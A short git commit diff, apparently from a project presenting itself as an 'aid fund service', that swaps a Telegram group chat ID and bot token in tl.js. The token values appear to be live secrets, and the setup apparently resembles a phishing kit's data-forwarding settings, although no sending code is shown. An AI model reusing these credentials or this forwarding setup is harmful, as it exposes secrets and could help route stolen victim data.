c4028569e54b1d4209cddba320e394ae0755c738
Layanan-dana-bantuan <layananbantuanovo@gmail.com>
2026-04-16 20:06:16 +0700

    Update tl.js

--- tl.js
+++ tl.js
@@ -1,2 +1,2 @@
-const grup = "6989148477";
-const token  = "8446620248:AAEepdNIXK15ZYyapdDlD8LGmyQZCMUx9ng";
+const grup = "5842054391";
+const token  = "8766537626:AAEmY1nNLQGwt2mAe4VstJJGFAnczHUHi-Q";
